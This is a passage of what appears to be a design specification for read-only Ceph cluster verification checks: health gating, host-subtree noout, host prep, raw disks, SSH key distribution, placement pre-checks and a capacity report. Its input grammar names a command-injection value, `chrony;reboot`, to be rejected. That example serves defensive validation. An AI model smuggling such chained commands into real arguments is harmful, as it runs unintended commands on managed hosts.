  - With `wantOk: true`, the verdict passes on `HEALTH_OK`, and on
    `HEALTH_WARN` only when every active check is on the allowlist. It fails in
    every other case.
  - With `wantOk: false` and an empty allowlist, the verdict passes on
    `HEALTH_ERR` (checks may be empty), and on `HEALTH_WARN` with at least one
    active check. It fails on `HEALTH_OK`, a missing status, an unknown status,
    and a warning with no named check.
- **Allowlist guidance (a documentation requirement):**
  - There MUST NOT be a default allowlist.
  - The README MAY name the two checks measured firing as expected during a
    host maintenance window: `CEPHADM_FAILED_DAEMON` (the drained host's
    daemons) and `OSD_FLAGS` (the host-subtree noout, which is the point of the
    window). It MUST NOT suggest any check that has not been observed.
  - Matching is by name, never by count or percentage.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyHealth-<host>`.
  - expected = `wantOk`.
  - actual = the healthy boolean, or `null` on any refusal.
- **Failure modes:**
  - each refusal above → failing verdict;
  - a mismatch → failing verdict;
  - a transport error → unconditional throw.
- **Security:** no caller value reaches the command.
- **Why:**
  - Treating an empty read as "not healthy" lets `wantOk: false` pass on no
    data. An empty read must never certify anything.
  - A warning with an empty `checks` map makes "no checks outside the
    allowlist" vacuously true, so `wantOk: true` would pass a warned cluster
    nobody looked at. Both mistakes fail open.
  - Under `wantOk: false`, an allowlist inverts the gate. It would pass on
    unlisted checks or `HEALTH_ERR`, and fail when only the tolerated checks
    fire. That mistake is silent, so the method refuses rather than guesses. To
    tolerate known warnings, use `wantOk: true` with the allowlist.
  - A guessed allowlist entry silences a check nobody has seen fire.
  - Numeric thresholds such as degraded percentages or PG counts drift
    continuously during remapping, so they go stale within seconds.
- **Test obligations:**
  - [ ] `{}` with `wantOk` true → fail, actual null. With `wantOk` false → fail,
        actual null (D38).
  - [ ] `{status: "HEALTH_UNKNOWN", checks: {}}` for both `wantOk` values →
        fail, actual null (D38).
  - [ ] Lower-case `health_ok` with `wantOk` true → pass (D44).
  - [ ] `{status: HEALTH_ERR, checks: {}}` with `wantOk` false → pass (positive
        control).
  - [ ] `HEALTH_OK` with `wantOk` true → pass.
  - [ ] `HEALTH_WARN` with `OSD_DOWN` and no allowlist → fail, and
        `activeChecks` names it.
  - [ ] A warning whose checks are all on the allowlist, with `wantOk` true →
        pass. Cover a single check, and the pair `CEPHADM_FAILED_DAEMON` +
        `OSD_FLAGS`.
  - [ ] That pair plus `PG_DEGRADED` → fail, with `unallowedChecks` =
        `[PG_DEGRADED]`.
  - [ ] `HEALTH_ERR` with every check on the allowlist and `wantOk` true → fail.
  - [ ] An empty payload with an allowlist and `wantOk` true → fail, actual null.
  - [ ] `wantOk: false` with a non-empty allowlist, against each of {a warning
        with only allowlisted checks, a warning with an extra check, ERR, OK} →
        fail. In each case actual is null, expected is false, the reason
        mentions `wantOk`, and `detail.status` and `detail.allowedWarnings` are
        echoed (D38).
  - [ ] `wantOk: false` with an empty allowlist: a warning with a check → pass;
        OK → fail.
  - [ ] `HEALTH_WARN` with `checks` absent, and with `checks: {}`, for both
        `wantOk` values and with `wantOk: true` plus an allowlist → fail, actual
        null (D38).
  - [ ] Method level: `HEALTH_OK` → passing record. `HEALTH_WARN` with
        `OSD_DOWN` and `throwOnFail` → record written, then the thrown error
        names `OSD_DOWN` (D40).

### 4.2 cephVerifyHostNoout

- **Safety class:** RO. It never sets or clears the flag.
- **Purpose:** Check whether the **host-subtree** `noout` flag is set for one
  Ceph host, against an expectation that the caller must state.
- **Inputs:**

| Argument | Type | Required | Default | Rule |
|---|---|---|---|---|
| common (§1.4) | | | | |
| `hostName` | string | yes | | hostname grammar. The Ceph host whose subtree flag is checked. It may differ from `host` |
| `expectSet` | boolean | yes | **none, on purpose** | `true`: the flag must be set (a gate before a disruption). `false`: it must be clear (a sweep for leftovers after a window that failed part-way) |

- **Behaviour:**
  1. Apply the shared predicate in §1.7 to `ceph health detail -f json`
     (D46).
  2. pass = (observed = `expectSet`).
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyHostNoout-<host>-<hostName>`.
  - `subject` = `hostName`.
  - expected `{hostName, nooutSet: expectSet}`.
  - actual `{hostName, nooutSet}`.
  - detail holds:
    - the raw `OSD_FLAGS` summary and detail messages;
    - which statement matched, if any;
    - where the answer was read from (`checks.OSD_FLAGS`);
    - an explicit statement that the `ceph osd dump` flags were **not**
      consulted.
- **Failure modes:** a mismatch → failing verdict. A transport error →
  unconditional throw.
- **Security:** `hostName` is used only for local matching and never reaches a
  command.
- **Why:** see §1.7. Neither direction may be defaulted, because both wrong
  answers are dangerous.
- **Test obligations:**
  - [ ] A summary naming the host → set.
  - [ ] Only a `detail[]` message names the host → set (D46).
  - [ ] Flags `noin,noout` and `noout,noin` → set in both orders (D46).
  - [ ] A host whose name is a prefix of the flagged host → not set, with a
        positive control on the full name.
  - [ ] `OSD_FLAGS` absent → not set.
  - [ ] All four combinations of set/clear × `expectSet` → pass exactly when
        the two agree.
  - [ ] The record states that it read `OSD_FLAGS` and did not read
        `osd dump`, and carries `subject`.
  - [ ] Two calls on one admin host for different `hostName` values → two
        distinct records.

---

## 5. Host checks

### 5.1 cephVerifyHostPrep

- **Safety class:** RO. It never installs, enables or downloads anything.
- **Purpose:** Assert the facts that `cephHostPrep` establishes, without
  running it. Running it would install software on a host that was only being
  inspected.
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `expectedPackages` | string[] | yes | non-empty. Each entry uses the Debian package-name grammar (D15), and is still quoted |
| `expectedCephadmVersion` | string | yes | the same version grammar that `cephHostPrep` uses for its pinned version (02-hostprep) |
| `expectedTimeSyncService` | string | yes | the same unit-name grammar that `cephHostPrep` uses (02-hostprep). Accepted: `chrony`, `systemd-timesyncd`. Rejected: `chrony;reboot` |

- **Behaviour:**
  1. **Packages.** For each package, run `dpkg -s '<pkg>'`. Exit 0 means
     present, and the version is taken from the `Version:` line.
  2. **cephadm present.** Run `test -x` on the cephadm install path that
     `cephHostPrep` uses (02-hostprep).
  3. **cephadm version.** If cephadm is present, run `sudo <path> version`,
     exactly as `cephHostPrep` runs it (D13).
     - Parse the version token: the first whitespace-delimited token after the
       word `version`.
     - Compare that token with `expectedCephadmVersion` for exact equality
       (D14). A substring match is not allowed.
     - Example: output `cephadm version 19.2.3 (<hash>) squid (stable)` gives
       token `19.2.3`. Expected `19.2.3` passes. Expected `19.2.30` or `19.2`
       fails.
     - If no token can be parsed, the version check fails, and the raw output
       is kept in actual.
  4. **Time sync.** Run `systemctl is-active '<service>'`. The service is
     active only when the trimmed stdout is exactly `active`.
  5. pass = no package missing AND cephadm present AND version token equal AND
     time sync active.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyHostPrep-<host>`.
  - expected `{packages, cephadmPresent: true, cephadmVersion, timeSyncActive:
    true}`.
  - actual `{missingPackages, cephadmPresent, cephadmVersion (parsed token or
    null), cephadmVersionOutput, timeSyncActive}`.
  - detail `{packages: [{name, present, version}]}`.
- **Failure modes:**
  - a missing package → failing verdict;
  - cephadm absent → failing verdict;
  - a version mismatch, or an unparseable version → failing verdict;
  - time sync inactive → failing verdict.
- **Security:** every value is grammar-checked and quoted. The method issues
  only `dpkg -s`, `test -x`, `cephadm version` and `systemctl is-active`.
- **Why:** a substring check would accept `19.2.30` for `19.2.3`. The
  prepare step and this check must also run `cephadm version` the same way, or
  they can disagree about the same host (D13).
- **Test obligations:**
  - [ ] All good → pass.
  - [ ] Missing packages are named, in actual and in the error.
  - [ ] cephadm absent → fail.
  - [ ] Version `19.2.30` against expected `19.2.3` → fail (D14).
  - [ ] `cephadm version` is issued under `sudo` (D13).
  - [ ] Time sync inactive → fail, and the error names the service.
  - [ ] The method issues only dpkg, test, version and systemctl is-active,
        never `apt-get install`, `curl`, `chmod` or `systemctl enable`.
  - [ ] An injection attempt in `host` or in a package name → rejected (D15).

### 5.2 cephVerifyDisksRaw

- **Safety class:** RO. It never wipes.
- **Purpose:** Assert that each named device, resolved by serial, is genuinely
  raw. This is stricter than the in-use gate in `wipeDiskToRaw`, which only
  refuses mounted devices.
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `dataDevices` | `{serial}[]` | yes | non-empty. Each serial uses the device-serial grammar |

- **Behaviour:**
  1. Read `lsblk -J -o NAME,PATH,MOUNTPOINT,TYPE,FSTYPE` once. Output that is
     not JSON is an unconditional fault.
  2. Resolve each serial with the shared serial-to-device resolver
     (01-transport; D3, D4, D5). Zero matches, or several distinct devices, is
     an **unconditional throw**, because that is a configuration fault, not a
     verdict.
  3. Find the lsblk node for the resolved block device, searching recursively.
     A node that is not found → that device fails, with actual `"not found"`.
  4. A device is raw when all of these hold:
     - it has no `fstype` (this covers a filesystem, `LVM2_member` and
       `linux_raid_member` alike);
     - it has no child devices;
     - there is no mountpoint anywhere in its subtree.
  5. Child devices are reported by their lsblk `type` (`part`, `lvm`, `raid1`,
     `crypt`, and so on), not all as "partitions" (D17).
  6. Combine one sub-check per serial (§1.2).
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyDisksRaw-<host>`.
  - Per-device expected and actual values.
  - `detail.perDevice`: for each serial, the by-id path (D5), the observed
    kernel name, `fstype`, `children: [{name, type}]` and `mountpoints`.
  - `detail.mounted`: serials whose subtree is mounted.
  - `detail.unobserved`: serials not found in lsblk.
  - A disk that is merely not raw appears in neither list.
- **Failure modes:**
  - a signature → failing verdict;
  - children → failing verdict;
  - mounted → failing verdict;
  - not found → failing verdict;
  - ambiguous or unmatched serial → unconditional throw.
- **Security:** serials pass the grammar and are re-validated by the resolver
  (D3). The lsblk read takes no caller value.
- **Why:** "not mounted" is not "raw". Leftover LVM, md or filesystem
  signatures make cephadm refuse the device, or worse, look reusable.
- **Test obligations:**
  - [ ] A bare device → pass.
  - [ ] `fstype` present → fail, naming it. An unwiped device → the error names
        the signature.
  - [ ] A `part` child → fail, reported as type `part`. An `lvm` child → fail,
        reported as type `lvm`, not "partition" (D17).
  - [ ] Mounted → fail, naming the mountpoint, and the serial appears in
        `detail.mounted`.
  - [ ] Resolved device missing from lsblk → `"not found"`, and the serial
        appears in `detail.unobserved`.
  - [ ] The combined verdict passes only when every device passes.
  - [ ] lsblk is read exactly once.
  - [ ] An ambiguous serial → throws even with `throwOnFail: false`, and no
        record is written.
  - [ ] An injection attempt in a serial → rejected.

### 5.3 cephVerifyKeyDistributed

- **Safety class:** RO. It is a plain host read over SSH, with no cephadm.
- **Purpose:** An independent check of key distribution. It re-reads each
  host's `authorized_keys` on a fresh connection, rather than trusting the
  distribution method's own "already present" report, which is the writer
  describing its own write (D58).
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| shared SSH family without `host` (§1.4) | | | |
| `hosts` | string[] | yes | non-empty, hostname grammar. The same list the distribution was given |
| `cephPubKey` | string | yes | the bare SSH public-key line grammar used by `cephDistributeKey` (03-lifecycle). It is validated again when the method runs, because in composed runs it arrives through a data read rather than a literal |

- **Behaviour:** for each host, in the given order:
  1. Open a new SSH connection. A multiplexed master connection left open by
     the distribution step MUST NOT be reused.
  2. Run a fixed-string, quiet grep for the single-quoted key against the same
     `authorized_keys` file that `cephDistributeKey` writes for this `sshUser`
     (03-lifecycle), allowing a non-zero exit:
     `grep -qF -- '<cephPubKey>' ~/.ssh/authorized_keys`.
  3. Map the outcome:

| Outcome | Result |
|---|---|
| exit 0 | `present` |
| exit 1 | `absent` (the file is readable, the key is not in it) |
| any other command exit | `unreadable`, with stderr, or stdout, or `grep exited <n>`, as detail |
| typed transport error (D8: exit 255, connection failure, timeout) | `unreachable` |

  4. Continue to the next host whatever the outcome.

  pass = every host produced a read-back AND none is `absent`, `unreadable` or
  `unreachable`.

  If any host was `unreachable`, the method writes the record first and then
  throws the typed transport error, whatever `throwOnFail` says. That error
  names every unreachable host.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyKeyDistributed-<host:port,…>` (§1.3); the `host` field is
    the same joined list.
  - expected `{hosts, condition: "key present in authorized_keys on every
    host"}`.
  - actual: per host, `{host, outcome, present, readable, detail?}`.
  - detail holds:
    - `missingHosts`, `absentOn`, `unreadableOn`, `unreachableOn`;
    - a fixed statement of what this check cannot see.
- **Failure modes:**
  - `absent` or `unreadable` on any host → failing verdict;
  - an expected host with no read-back → failing verdict (`missingHosts`);
  - `unreachable` → record, then a typed transport error.
- **Security:**
  - The key is matched literally (`-F`), never as a regex. It is placed after
    `--` and shell-quoted.
  - The key is public, but it still passes its grammar.
- **Why:**
  - "Not there" and "could not look" lead to different actions. Collapsing them
    would send someone to re-run a distribution that may have worked.
  - "Unreachable" is a third case. It says nothing about the file.
  - This check cannot prove that sshd will accept the key (file location,
    ownership, mode, or a non-default `AuthorizedKeysFile`). It cannot prove
    that cephadm can log in either: that needs the private half, which the
    extension never holds. The record says so, so a green run is not read as
    more than it is.
- **Test obligations:**
  - [ ] Every host exits 0 → pass (negative control).
  - [ ] grep exits 0, 1 and 2 on three hosts → present/absent/unreadable,
        `absentOn = [h2]`, `unreadableOn = [h3]`, pass false.
  - [ ] An expected host with no read-back → fail, listed in `missingHosts`.
  - [ ] SSH exit 255 on one host → outcome `unreachable` (not `unreadable`),
        later hosts are still read, the record is written, then a typed
        transport error is thrown, even with `throwOnFail: false` (D8, D40).
  - [ ] Each host's read uses a new connection, with no ControlMaster reuse.
  - [ ] The key is passed with `-F` after `--`, and is quoted.
  - [ ] A malformed `cephPubKey` that arrives at runtime → rejected before any
        SSH call.
  - [ ] The record key is the same for hosts `[b, a]` and `[a, b]`.

---

## 6. Placement pre-checks

These checks judge a **proposed** change before a human is asked to approve it.
They apply nothing. The intended use is to call them with `throwOnFail: false`
before the approval gate, and then assert on `pass`. `detail.reasons` holds one
human-readable sentence per failed check.

### 6.1 cephVerifyMonPlacement

- **Safety class:** RO (pre-approval).
- **Purpose:** Judge a proposed mon host list against live quorum. This is the
  same predicate that `cephApplyMon` uses for its quorum-safety refusal (D26).
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `placement` | string[] | yes | non-empty, hostname grammar. These are cephadm host names |

- **Behaviour:**
  1. Read, in this order:
     - `ceph quorum_status -f json`;
     - `ceph orch ps -f json`;
     - `ceph orch host ls -f json`.
  2. **Monmap entries.** Let M be the entries of `monmap.mons[]`, and Q the
     names in `quorum_names`. outOfQuorum = entries of M not in Q.
  3. **Entry to host.** For each entry m in M, its host is the `hostname` of
     the `orch ps` row with `daemon_type` `mon` and `daemon_id` equal to m's
     name.
     - A mon's name is **never** taken to be its host. Mon names match hostnames
       only by convention.
     - An entry with no matching row is **unmapped**. It fails closed, because
       its contribution to the majority cannot be judged.
     - `orch ps` mon rows that are not in M are reported in detail as
       `orchOnlyMons`. They count toward nothing.
  4. **Host sets.** currentHosts = the distinct hosts of the mapped entries in
     M. Then:
     - retainedHosts = placement ∩ currentHosts;
     - removedHosts = currentHosts − placement;
     - addedHosts = placement − currentHosts.
  5. **Majority (D42).** retainedMons = the entries of M that are in Q and
     whose host is in placement. majorityKept = 2 × |retainedMons| > |M|.
     - The count is over monmap **entries**, so two mons on one host count as
       two.
     - Orchestrator listings never stand in for the monmap.
  6. **Empty monmap.** An empty M fails closed. Otherwise one retained host
     would count as a "strict majority" of zero.
  7. **Unknown hosts.** unknownPlacementHosts = placement hosts that are absent
     from `orch host ls`.
  8. **Unavailable hosts.** unavailableAddedHosts = added hosts whose host-ls
     `status` is non-empty (for example `offline` or `maintenance`), because
     cephadm cannot deploy a new daemon there. Retained hosts are not judged
     on status.
  9. pass = M non-empty AND outOfQuorum empty AND no unmapped entry AND
     unknownPlacementHosts empty AND unavailableAddedHosts empty AND
     majorityKept.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyMonPlacement-<host>`.
  - expected = a set of true flags: `monmapNonEmpty`, `allInQuorum`,
    `allMonsMapped`, `hostsKnown`, `addedHostsDeployable`, `majorityKept`.
  - actual = the corresponding observations, plus `retainedHosts`,
    `removedHosts` and `addedHosts`.
  - detail holds:
    - `monNames`, `quorumNames`, `outOfQuorum`;
    - `monHosts: [{name, host | null, status}]`;
    - `unmappedMons`, `orchOnlyMons`;
    - `placement`, and the three host splits;
    - `retainedMons`;
    - `unknownPlacementHosts`, `unavailableAddedHosts`;
    - `majorityKept`, `monmapEmpty`;
    - `reasons`.
- **Failure modes:** each condition in step 9 → failing verdict, with a
  reason.
- **Security:** placement hosts are compared locally and never reach a
  command.
- **Caveat (for the description):** added hosts are checked for
  deployability only, not for capacity.
- **Why:** removing a majority of mons in one apply loses quorum, and the
  cluster stops serving. The check must be made against the monmap that Ceph
  itself uses for quorum.
- **Test obligations:**
  - [ ] Unchanged 5-mon placement → pass, with empty reasons.
  - [ ] A mon out of quorum → fail, with its name in the reasons.
  - [ ] Keeping 2 of 5 → fail, `majorityKept: false`, and a reason about the
        majority.
  - [ ] Keeping 3 of 5 → pass.
  - [ ] A placement host missing from `host ls` → fail, with
        `unknownPlacementHosts = [it]`.
  - [ ] An added host with status `offline` → fail, with
        `unavailableAddedHosts = [it]` and a reason naming the host and
        `offline`.
  - [ ] A mon whose name differs from its host maps through `orch ps`: placing
        by host passes; placing by mon name → unknown host, fail.
  - [ ] An empty monmap while `orch ps` shows mons → fail, with a reason saying
        the monmap lists no mons.
  - [ ] Two monmap entries on one host, out of a monmap of 3, with placement
        keeping only that host → majority computed over entries (2 × 2 > 3 →
        kept) (D42).
  - [ ] A monmap entry with no `orch ps` row → fail closed, listed in
        `unmappedMons` (D42).
  - [ ] An `orch ps` mon row that is absent from the monmap → reported in
        `orchOnlyMons`, and it does not count toward the majority (D42).
  - [ ] Execution issues the three commands in order, and writes key
        `cephVerifyMonPlacement-<host>`.
  - [ ] `throwOnFail: false` with the majority lost → a failing record, and no
        throw.

### 6.2 cephVerifyMgrPlacement

- **Safety class:** RO (pre-approval).
- **Purpose:** Judge a proposed mgr host list without applying it, chiefly to
  report a mgr landing on the host of an **active** MDS. Keeping the two apart
  is the caller's decision. This method reports it, and `cephApplyMgr` does not
  enforce it (D29).
- **Inputs:**

| Argument | Type | Required | Rule |
|---|---|---|---|
| common (§1.4) | | | |
| `placement` | string[] | yes | non-empty, hostname grammar |

- **Behaviour:**
  1. Read, in this order:
     - `ceph mgr dump -f json`;
     - `ceph fs dump -f json`;
     - `ceph orch ps -f json`;
     - `ceph orch host ls -f json`.
  2. **Active mgr.** The active mgr is `active_name`. Its host is the `hostname`
     of the `orch ps` row with `daemon_type` `mgr` and `daemon_id` equal to
     that name, or null if no row matches.
  3. **Active MDS.** For each filesystem in `filesystems[]`, the active MDS
     entries are the entries under `mdsmap.info` whose `state` is exactly
     `up:active` (case-insensitive, D44). `up:standby-replay` is **not**
     active. Each entry's host is the `orch ps` mds row whose `daemon_id`
     equals the entry's `name`, or null if it is unmapped.
  4. **Fail conditions:**
     - no active mgr;
     - a placement host unknown to `orch host ls`;
     - an active MDS that cannot be mapped to a host (this fails closed,
       because co-location cannot be judged);
     - a placement host that already runs an active MDS;
     - a filesystem with no `up:active` MDS observed (this fails closed: a
       healthy CephFS always has rank 0 active, so an empty answer means the
       filesystem is down or the parse is wrong).
  5. A cluster with no filesystems passes the MDS part.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyMgrPlacement-<host>`.
  - expected = flags: `activeMgrPresent`, `hostsKnown`, `activeMdsMapped`,
    `placementClearOfActiveMds`, `everyFsHasActiveMds`.
  - actual `{activeMgr | null, unknownPlacementHosts, unmappedMds,
    besideActiveMds, fsWithoutActiveMds, activeMds: [{fsName, name}]}`.
  - detail holds:
    - `activeMgr {name, host}`;
    - `mgrHosts`;
    - `activeMds` with ranks and hosts;
    - the lists above;
    - `reasons`.
- **Failure modes:** each condition in step 4 → failing verdict, with a reason.
- **Security:** placement hosts are compared locally only.
- **Why:** with count-based placement, the active mgr and the active MDS can
  drift onto one host. Losing that host then costs both roles at once.
- **Test obligations:**
  - [ ] Placement containing the active MDS's host → fail.
  - [ ] Placement naming only the standby-replay MDS host → pass.
  - [ ] A filesystem with no `up:active` MDS → fail.
  - [ ] Empty `active_name` → fail.
  - [ ] An active MDS with no `orch ps` row → fail.
  - [ ] No filesystems → pass.
  - [ ] Execution issues the four commands in order.
  - [ ] `throwOnFail: false` → a failing record keyed
        `cephVerifyMgrPlacement-<host>`, and no throw.

### 6.3 cephVerifyOsdClaimable

- **Safety class:** RO (pre-approval).
- **Purpose:** Judge which disks cephadm **would** claim, before an OSD
  apply.
- **Inputs:**

| Argument | Type | Required | Default | Rule |
|---|---|---|---|---|
| common (§1.4) | | | | |
| `allAvailableDevices` | boolean, nullish | no | `false` | fleet-wide mode |
| `excludeDevices` | `{serial, reason?}[]`, nullish | conditional | `[]` | serials that must never be claimed (boot devices, boot mirrors). `serial` uses the device-serial grammar. `reason` is free text, at most 256 printable characters |
| `targetHost` | string, nullish | conditional | `""` | hostname grammar; `""` means absent |
| `dataDevices` | `{serial}[]`, nullish | conditional | `[]` | device-serial grammar; `[]` means absent |

- **Mode rule.** This mirrors `cephApplyOsd`. It is enforced by the schema
  **and** re-validated when the method runs (D20). Exactly one mode applies:
  - **Fleet mode:** `allAvailableDevices` is true. It requires a non-empty
    `excludeDevices`, and forbids `targetHost` and `dataDevices`.
  - **Selector mode:** `dataDevices` is non-empty. It requires `targetHost`,
    and forbids `allAvailableDevices: true`.
  - Empty values mean absent, because a workflow cannot leave a key out.
- **Behaviour:**
  1. Read `ceph orch device ls -f json` once. This is cephadm's cached view, and
     `--refresh` is not passed.
  2. **Serial match.** A `device_id` matches a serial when it equals the serial,
     or ends with `_<serial>`. Ceph's device id has the form
     `<manufacturer>_<model>_<serial>`. Examples, for serial `S123`:
     - match: `S123`, `ACME_Disk_S123`;
     - no match: `ACME_Disk_XS123`, a serial that is only a suffix of the last
       segment;
     - no match: `ACME_Disk_S12`, a truncated serial.
  3. **Fleet mode.** The claimable set is every device with `available` exactly
     `true`, on every host. The verdict fails, with one reason per finding,
     when:
     - a claimable device matches an excluded serial;
     - a claimable device has an empty `device_id`, so it cannot be compared;
     - the listing has no hosts;
     - a host row has no `devices` array (malformed);
     - a host row has an **empty** `devices` list. It has not been inventoried
       yet, and the persistent all-available spec would claim its disks once it
       is scanned.
  4. **Selector mode.**
     - The verdict fails when `targetHost` is absent from the listing, or when
       any serial matches zero devices, or more than one, on that host.
     - Availability is **reported** per serial (`path`, `available`,
       `rejected_reasons`) but is not required. A device that already serves
       this service's OSD reads as unavailable on a converging re-run.
- **Idempotency:** a pure read.
- **Output / record:**
  - Key `cephVerifyOsdClaimable-<host>`.
  - **Fleet mode:**
    - expected `{claimableDevicesExclude: [serials]}`;
    - actual `{claimableExcluded, unidentified, malformedHosts,
      hostsWithoutDevices}`.
  - **Selector mode:**
    - expected `{targetHost, eachSerialMatchedExactlyOnce: true}`;
    - actual `{targetKnown, matched: {<serial>: count}}`.
  - detail always carries `mode`, the claimable lists, per-serial data and
    `reasons`.
- **Failure modes:**
  - each finding above → failing verdict;
  - a mode-rule violation → validation fault (unconditional).
- **Security:** serials are compared locally only. No caller value reaches
  the command.
- **Why:** cephadm's "available" means **empty**, not **safe to claim**. A raw
  boot mirror becomes an OSD if nothing compares the available devices against
  a hold-back list (D19).
- **Test obligations:**
  - [ ] Serial matching: exact match → match; `_`-suffix → match; a partial
        last-segment suffix → no match; a truncated serial → no match.
  - [ ] Fleet mode:
    - [ ] an available device matching an excluded serial → fail, with
          `claimableExcluded` naming it and the reasons containing the serial;
    - [ ] an empty `device_id` → fail;
    - [ ] an empty listing → fail;
    - [ ] a host row without `devices` → fail (`malformedHosts`);
    - [ ] an empty `devices` list → fail (`hostsWithoutDevices`), including
          when another host is inventoried;
    - [ ] the excluded device is unavailable → pass, with an empty claimable
          list.
  - [ ] Selector mode:
    - [ ] matched but unavailable → pass;
    - [ ] unmatched → fail, with matched 0;
    - [ ] unknown host → fail, with a reason naming it;
    - [ ] double match → fail, with matched 2.
  - [ ] Mode rule. Of these cases, only the two valid ones parse: valid fleet;
        valid selector; both modes; neither; fleet without excludes; fleet with
        `targetHost`; selector without `targetHost`.
  - [ ] The same violations are refused when the schema is bypassed and the
        method runs (D20).
  - [ ] Execution in fleet mode with `throwOnFail: false` → issues `orch device
        ls -f json`, writes a failing record, and does not throw.

---

## 7. cephCapacityReport

This method is a report, not a verdict. It takes no `throwOnFail` and writes
no `cephVerifyResult`. Any pass/fail decision belongs to the caller.

- **Safety class:** RO.
- **Purpose:** Show cluster and per-pool usage together with the durability
  margin, so an operator can size work or judge whether taking a failure domain
  out is safe.
- **Inputs:** the shared SSH argument family only (00-overview §3).
- **Preconditions:** a reachable admin host.
- **Behaviour:**
  1. Read `ceph df -f json` and `ceph osd pool ls detail -f json`. If the
     detail output parses as JSON but is not an array, treat it as an empty
     list.
  2. **Join by pool name.** `ceph df` gives `pools[].name`, and the detail gives
     `pool_name`. Entries with a missing or empty name are skipped.
  3. The join is a **union**. Every name seen in either read appears once, and
     the list is sorted by name.
  4. **Per pool:**

| Field | Taken from |
|---|---|
| `name` | the join key |
| `id` | detail `pool`, falling back to df `id` |
| `poolType` | detail `type`: number 1 → `replicated`; number 3 → `erasure`; anything else, including missing or the string `"3"` → `unknown` |
| `size`, `minSize` | detail `size`, `min_size` |
| `minSizeMargin` | `size − minSize`, or null if either is null |
| `pgNum` | detail `pg_num` |
| `ecProfile` | detail `erasure_code_profile` if it is a non-empty string, else null |
| `storedBytes`, `usedBytes`, `percentUsed`, `maxAvailBytes`, `objects` | df `stats.stored`, `bytes_used`, `percent_used`, `max_avail`, `objects` |
| `partial` | true unless the pool appeared in both reads |

  5. **Cluster totals**, from df `stats`:
     - `totalBytes` (`total_bytes`);
     - `availBytes` (`total_avail_bytes`);
     - `usedBytes` (`total_used_bytes`);
     - `rawUsedRatio` (`total_used_raw_ratio`);
     - `numOsds` (`num_osds`).
  6. **Numbers.** Every numeric field is the value only if it is a finite
     number. Otherwise it is null, never 0.
  7. Compute `poolCount` and `partialCount`.
  8. **`atRiskPools`** = the names of pools with `poolType` = `erasure` and
     `minSizeMargin` ≤ 1 (D35). Margin 0 is included. A replicated or `unknown`
     pool is never listed.
  9. If `poolCount` is 0 → throw `cephadm[capacity]:` with `poolCount=0`.
  10. Log one `info` line (pool count, OSD count, at-risk count), then write the
      report.
- **Idempotency:** a pure read. On an unchanged cluster, consecutive reports
  are identical apart from `observedAt`.
- **Output / record:**
  - Resource `cephCapacityReport`, with lifetime `7d`, keeping the last 10
    versions.
  - Key `cephCapacityReport-<host>`.
  - The schema is strict and declares every field: `host`, `cluster {totalBytes,
    availBytes, usedBytes, rawUsedRatio, numOsds}`, `pools[]` (the fields in the
    table above), `poolCount`, `partialCount`, `atRiskPools` and `observedAt`
    (ISO-8601, from the injected clock).
- **Post-verification:** none.
- **Failure modes:**
  - either read fails, or returns output that is not JSON → throw;
  - zero pools in total → throw.
- **Security:** no caller value reaches a command.
- **Why:**
  - The margin, not size alone, tells you whether a failure domain can be taken
    out. An EC 5/4 pool has margin 1, so one host out leaves it at exactly
    min_size.
  - "Margin ≤ 1" alone flags every replicated 3/2 pool, and a list that flags
    everything flags nothing. A replicated 3/2 pool that loses a host still has
    2 replicas, and Ceph re-replicates onto the remaining hosts. An EC pool
    that spans exactly k+m hosts and loses one has nowhere to rebuild.
  - A union join keeps any disagreement between the two reads visible. An
    intersection would silently drop a pool.
  - Null instead of 0 keeps "no reading" distinct from "empty pool".
  - An unknown pool type must never be guessed as replicated, because that would
    mislead the margin judgement.
  - A cluster with no pools cannot be told apart from a failed read, so "0
    pools, all fine" would be a false zero.
  - Sorting makes reports for an unchanged cluster identical from run to run.
- **Test obligations:**
  - [ ] Pool-type mapping: 1 → replicated; 3 → erasure; 2 → unknown; undefined
        → unknown; the string `"3"` → unknown.
  - [ ] Replicated 3/2 (pg 32) and EC 5/4 (pg 128, profile set), both with
        matching df entries:
    - [ ] `poolCount = 2`, `partialCount = 0`;
    - [ ] the EC pool is erasure, with size/minSize/margin 5/4/1, pgNum 128,
          the profile kept, and `storedBytes` taken from df;
    - [ ] the replicated pool is 3/2/1, with `ecProfile` null.
  - [ ] `atRiskPools` contains only the EC pool, whether the replicated pool is
        3/1 or 3/2. A replicated pool is never listed (D35).
  - [ ] An EC pool with margin 0 (for example 5/5) → listed in `atRiskPools`
        (D35).
  - [ ] An EC pool with margin 2 → not listed (D35).
  - [ ] Union join:
    - [ ] a pool in df but missing from detail → still listed, with
          `partial: true`, size and margin null, and df stats kept;
    - [ ] pools in detail but an empty df pool list → both listed,
          `partialCount = 2`, `usedBytes` null, size kept;
    - [ ] both reads complete → `partialCount = 0`.
  - [ ] A df with no `stats` objects → every per-pool byte and object field is
        null, and the cluster `totalBytes` and `numOsds` are null. With real
        data, `numOsds` carries the reported value.
  - [ ] Reversing the order of the df pools → the same name-sorted pool list.
  - [ ] Zero pools at method level → throws, and no report is written.
  - [ ] The record key is `cephCapacityReport-<host>`, the lifetime is `7d`,
        and the strict schema accepts every written field.

---

## Unresolved

1. **`atRiskPools` and partial EC pools.** An erasure-coded pool with a null
   margin (for example one missing from `osd pool ls detail`) is not listed,
   because its margin is unknown. Should it be listed, or put in a separate
   `unjudgedPools` list, so that the gap is not silent?
2. **`dpkg -s` exit 0** is also returned for a package left in the
   `deinstall ok config-files` state. Should `cephVerifyHostPrep` require
   `Status: install ok installed`? This would be stricter and fail safe.
3. **D38 "refused".** The contradiction case (`wantOk: false` plus an
   allowlist) is specified as a failing verdict, recorded and thrown under
   `throwOnFail`. Confirm that this is meant, rather than a validation-time
   rejection before any read.
4. **D29 versus §6.2.** `cephVerifyMgrPlacement` fails its verdict when a
